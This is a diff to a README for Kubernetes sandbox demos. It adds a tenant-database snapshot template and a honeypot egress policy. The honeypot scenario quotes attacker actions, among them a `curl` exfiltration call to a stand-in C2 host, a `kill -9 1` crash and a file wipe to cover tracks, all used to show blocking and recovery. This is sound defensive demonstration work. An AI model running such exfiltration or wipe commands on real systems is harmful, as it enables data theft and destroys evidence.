@@ -28,10 +28,12 @@ manifests/
   dungeon2d-gateway.yaml.tmpl   # Optional K8s Deployment + LoadBalancer Service for audience phone QR access
   coldstart-template.yaml.tmpl  # ActorTemplate (12s 50k-doc search index warmup -> Golden Snapshot)
   coldstart-hpa.yaml.tmpl       # K8s Deployment, L7 Router, HPAs, External Metrics APIService & coldstart-gateway
-  tenantdb-template.yaml.tmpl   # ActorTemplate (DurableDir /data, FULL pause, DATA commit)
-  tenantdb-gateway.yaml.tmpl    # Optional K8s Deployment + LoadBalancer Service for Storage & Memory Tiering X-Ray UI
-  honeypot-template.yaml.tmpl   # ActorTemplate (gVisor rootfs + RAM forensic trail)
-  honeypot-gateway.yaml.tmpl    # Optional K8s Deployment + LoadBalancer Service for Split-Screen Honeypot UI
+  tenantdb-template.yaml.tmpl         # ActorTemplate (DurableDir /data, SNAPSHOT_FIDELITY_MEMORY)
+  tenantdb-volumes-template.yaml.tmpl # ActorTemplate (DurableDir /data, native SNAPSHOT_FIDELITY_VOLUMES)
+  tenantdb-gateway.yaml.tmpl          # Optional K8s Deployment + LoadBalancer Service for Storage & Memory Tiering X-Ray UI
+  honeypot-template.yaml.tmpl         # ActorTemplate (gVisor rootfs + RAM forensic trail + systemInfo trust bundle + ate-secret://)
+  honeypot-egress-policy.yaml.tmpl    # Deny-by-default EgressPolicy + MITM ate-secret:// header replacement
+  honeypot-gateway.yaml.tmpl          # Optional K8s Deployment + LoadBalancer Service for Split-Screen Honeypot UI
   timewarp-template.yaml.tmpl   # ActorTemplate (heartbeat + lease loop for split-brain demo)
   timewarp-gateway.yaml.tmpl    # Optional K8s Deployment + LoadBalancer Service for Chronos Split-Brain Lab UI
   gateway-tls.yaml.tmpl         # GKE Gateway API + Certificate Manager TLS + HTTPRoutes + HealthCheckPolicies
@@ -131,7 +133,7 @@ Each of the demos is designed to isolate and prove a specific architectural prop
   3. **1-Command GDPR Article 17 Shredder:** Deleting a customer's entire compute environment, memory checkpoints, and durable storage is literally `kubectl ate delete actor db-acme -a anything-but-agents` (`404 TENANT_SHREDDED`), while sibling `db-globex` stays 100% online and intact.
 * **How does Substrate fit into this:**
   * **`DurableDir` volume (`volumes: [{name: data, durableDir: {}}]`)** provides a snapshot-backed per-actor filesystem directory (`/data`).
-  * **Split `snapshotConfig` (`onPause: FULL`, `onCommit: DATA`)** gives hot-RAM latency for bursty sessions and `99.997%` smaller data-only storage for long-term hibernation.
+  * **Dual `ActorTemplate` Fidelity (`tenantdb` with `SNAPSHOT_FIDELITY_MEMORY` vs. `tenantdb-volumes` with `SNAPSHOT_FIDELITY_VOLUMES`)** gives hot-RAM latency for bursty sessions (`db-acme`, `db-globex`) and `99.997%` smaller volume-only storage for long-term hibernation (`db-initech`, `db-umbrella`).
 
 ---
 
@@ -156,10 +158,13 @@ Each of the demos is designed to isolate and prove a specific architectural prop
   1. **Per-IP Isolation & $0 Idle Persistence:** Attacker A (`203.0.113.5`) steals decoy DB credentials and plants `rootkit.sh` / `dropper.sh` in `/tmp/honeypot` (triggering an automatic GCS snapshot `v2`), then disconnects ($0 compute). Attacker B (`198.51.100.9`) connects 10 seconds later and sees a pristine filesystem cloned from the Golden Snapshot.
   2. **Un-deleting `rm -rf` across Disk & RAM with `kubectl ate revert`:** Weeks later, Attacker A returns—their personal "Truman Show" movie set wakes in `~100ms` (even on a different GKE worker pod IP!) with their script still on disk. The attacker panics and runs `rm -f` to wipe their tracks. On the SOC side, `/forensics` flags `CRITICAL: ANTI_FORENSIC_WIPE_ATTEMPT` (`DELETED`), and with one click (**Revert Wipe** -> `kubectl ate revert actor`), the SOC Director rewinds the container rootfs overlay and RAM back to `v2`, bringing the deleted malware and its SHA-256 hash right back onto `/tmp/honeypot`!
   3. **Live Forensic Cloning (`--tag`):** The SOC Director clicks **Clone to Forensic Lab** (`kubectl ate create tag` + `kubectl ate create actor honeypot-forensic-lab --tag`) to detonate and analyze the malware in an isolated parallel sandbox while the attacker keeps typing in the original sandbox, completely oblivious.
+  4. **Zero-Trust Egress (`ActorEgressPolicy`) + MITM Credential Injection (`ate-secret://`):** When the attacker inspects `env` (`PAYROLL_API_TOKEN=ate-secret://k8s.io/default/anything-but-agents/payroll-vault-api/token`) or tries to exfiltrate data via `curl https://c2.attacker.evil/exfil`, the worker's `atenet` egress proxy blocks the unknown C2 domain (`EGRESS_POLICY_BLOCKED`) while ensuring raw API secrets never exist in process memory (`MITM_SECRET_PLACEHOLDER_OBSERVED`).
+  5. **OS-Level `STATE=CRASHED` Recovery (`kill -9 1` -> `kubectl ate revert actor`):** If an attacker triggers a fatal process crash (`kill -9 1` / **Crash PID 1**), the actor enters `ACTOR_STATE_CRASHED`, `atenet-router` refuses auto-wakeup (`409 Conflict`), and **Revert Wipe / Crash** (`kubectl ate revert actor`) restores the crashed container back to `ACTOR_STATE_SUSPENDED` at its last good checkpoint (`v2`) in <1 second.
 * **How does Substrate fit into this:**
   * **`sandboxConfig: {sandboxClass: gvisor}`** sandboxes untrusted `/bin/sh -c` execution.
   * **Rootfs delta checkpointing (`SNAPSHOT_FIDELITY_MEMORY`)** preserves `/tmp/honeypot/*` edits and RAM audit logs per actor across worker pod migrations without affecting the Golden Snapshot or other actors.
-  * **`kubectl ate suspend actor` + `kubectl ate revert actor` + `kubectl ate create tag`** turn container checkpointing into an anti-forensic recovery and live malware-cloning engine.
+  * **`EgressPolicy` + `systemInfo` trust bundles (`egress-mitm.ate.dev`) + `ate-secret://`** block unauthorized outbound C2 traffic and keep raw credentials out of sandbox memory.
+  * **`kubectl ate suspend actor` + `kubectl ate revert actor` + `kubectl ate create tag`** turn container checkpointing into an anti-forensic recovery, `STATE=CRASHED` self-healing, and live malware-cloning engine.
 
 ---
 
